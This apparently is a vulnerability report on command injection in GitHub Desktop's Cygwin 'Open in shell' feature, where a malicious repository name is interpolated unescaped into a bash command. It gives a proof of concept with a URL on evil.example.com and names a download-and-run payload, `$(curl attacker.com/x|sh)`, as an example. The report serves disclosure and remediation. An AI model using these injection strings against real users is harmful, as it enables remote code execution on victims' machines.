## Finding

### Title
Command Injection via Malicious Repository/Clone-Name When Opening a Cloned Repository in Cygwin - (`app/src/lib/shells/win32.ts`)

### Summary
GitHub Desktop's "Open in Shell" feature for Cygwin on Windows builds a shell command line by string-interpolating the local repository path into a `bash -lc` command that is itself wrapped in a single-quoted string, then passed to `spawn(..., { shell: true })`. The repository path is derived (via `Path.join`) from the folder name Desktop creates when cloning a repository, and that folder name is derived from the attacker-controlled repository name in a git remote URL. Because the “clone name” sanitizer only strips path-separator/traversal characters and never removes shell metacharacters, an attacker who controls a git remote (any non-GitHub.com git host, since GitHub.com's own name validation is not enforced by Desktop for the clone directory) can name a repository so that its filesystem path is embedded verbatim inside a `bash -c`-style command. Because the interpolation happens inside a *double-quoted* bash string, a `$(...)` command-substitution sequence in the path is not neutralized and is executed by the resulting bash process — arbitrary command execution.

### Finding Description
`clone()`/`sanitizeCloneName()` derive the local clone directory name straight from the URL-provided repo name: [1](#0-0) 

The function only rejects traversal segments (`..`, `.`) and splits on `/ \ :`; it does not filter out shell metacharacters such as `$`, `(`, `)`, `` ` ``, `&`, `'`, all of which are legal characters in NTFS/Windows filenames. This directory name then becomes the repository's on-disk `path`, which is threaded unchanged through the "Open in shell" flow: [2](#0-1) [3](#0-2) [4](#0-3) 

When the configured/selected shell is Cygwin, `Win32.launch()` builds the following command line and spawns it with `shell: true` (which on Windows executes via `cmd.exe /d /s /c "<command>"`): [5](#0-4) 

The repository `path` is interpolated inside a double-quoted bash substring (`"$(cygpath "${path}")"`). Bash performs command substitution (`$(...)`) even inside double quotes, so if the repository directory name itself contains a sequence like `$(calc.exe)` or `$(curl attacker.com/x|sh)`, that substitution is executed literally by the spawned `bash -lc` process — not neutralized by any of the surrounding quoting.

Existing guards do not stop this path:
- `sanitizeCloneName` only guards against directory-traversal, not shell metacharacters (confirmed by its test suite, which only covers traversal cases): [6](#0-5) 
- The generic clone dialog accepts arbitrary URLs to non-GitHub.com hosts, so GitHub.com's server-side name restrictions never apply: [7](#0-6) 
- No escaping function is applied to `path` before it is embedded into the Cygwin bash command in `win32.ts`; contrast with the dedicated shell-escaping helpers that *do* exist elsewhere in the codebase for the hooks-execution feature (`bashEscape`, `cmdEscape`, `powershellEscape`) but are not reused here: [8](#0-7) 

### Impact Explanation
A victim who clones an attacker-hosted repository (any non-GitHub.com git remote, e.g. a malicious self-hosted git server or forge) and later uses GitHub Desktop's built-in "Open in Cygwin" action on that repository will have arbitrary attacker-chosen commands executed with the victim's own privileges, entirely without further confirmation dialogs beyond the normal "Open in shell" click. This satisfies the "attacker controls a cloned/fetched repository … resulting in code execution" impact criterion.

### Likelihood Explanation
Requires: (1) victim uses Windows with Cygwin installed and selected as their terminal integration (a supported, documented option, not a hypothetical), (2) victim clones a repository from a URL the attacker controls (a normal, expected workflow — "Clone repository" → paste URL), and (3) victim clicks "Open in Cygwin" for that repository, which is an ordinary and expected user action, not an unnatural step. No local access, no leaked credentials, and no pre-existing malware are required — the malicious payload is entirely contained in the repository's own name/URL.

### Recommendation
- Reuse or extend the existing shell-escaping helpers in `app/src/lib/hooks/shell-escape.ts` (`bashEscape`, `cmdEscape`, `powershellEscape`) for every `path`/`foundShell.path` interpolation in `app/src/lib/shells/win32.ts`, `darwin.ts`, and `linux.ts`, particularly the Cygwin, Alacritty, Hyper, GitBash, and Warp cases that build ad hoc quoted strings.
- Alternatively/additionally, sanitize `sanitizeCloneName()` output to strip or reject shell-metacharacters (`$`, `` ` ``, `&`, `|`, `(`, `)`, `'`, `"`, `<`, `>`, `^`, `%`) in addition to path separators, since the resulting name is used not just for filesystem paths but is later fed into shell command construction.
- Prefer passing the working directory via the `cwd` spawn option (already done) and avoid re-embedding the path as a string literal inside another shell's command line at all where possible.

### Proof of Concept
1. Attacker hosts a git repository on a non-GitHub host at a URL whose final path segment is: `https://evil.example.com/owner/$(calc.exe).git`
2. Victim opens GitHub Desktop → "Clone repository" → "URL" tab → pastes the URL → clones. `sanitizeCloneName` returns `$(calc.exe)` unchanged, so Desktop creates the local folder `...\GitHub\$(calc.exe)`.
3. Victim selects Cygwin as the configured shell (Preferences → Integrations) and clicks "Open in Cygwin" for that repository.
4. `Win32.launch()` builds `spawn('"<cygwin path>"', ["/bin/sh -lc 'cd \"$(cygpath \"...\\GitHub\\$(calc.exe)\")\"; exec bash"], { shell: true, ... })`.
5. Bash evaluates `$(cygpath "...\$(calc.exe)")`, and inside that double-quoted argument, `$(calc.exe)` is itself expanded/executed by bash as a nested command substitution, running `calc.exe` (or any attacker payload) under the victim's account.

export function sanitizeCloneName(name: string): string | null {
  const components = name.split(/[/\\:]/)

  let lastComponent = ''
  for (let i = components.length - 1; i >= 0; i--) {
    if (components[i].length > 0) {
      lastComponent = components[i]
      break
    }
  }

  if (lastComponent.length === 0) {
    return null
  }

  if (lastComponent.endsWith('.git')) {
    lastComponent = lastComponent.slice(0, -4)
  }

// https://github.com/ericcornelissen/shescape/blob/89072ba7de233f81f5553b52098671c94eb9bd0c/src/internal/unix/bash.js#L39
const bashEscape = (arg: string) =>
  arg
    .replace(/[\0\u0008\u001B\u009B]/gu, '')
    .replace(/\r(?!\n)/gu, '')
    .replace(/'/gu, "'\\''")

const shQuoteCommand = (
  escapeFn: (arg: string) => string,
  cmd: string,
  ...args: string[]
) => [cmd, ...args].map(a => `'${escapeFn(a)}'`).join(' ')

export const bash: Shell = {
  args: ['-ilc'],
  quoteCommand: shQuoteCommand.bind(null, bashEscape),
}
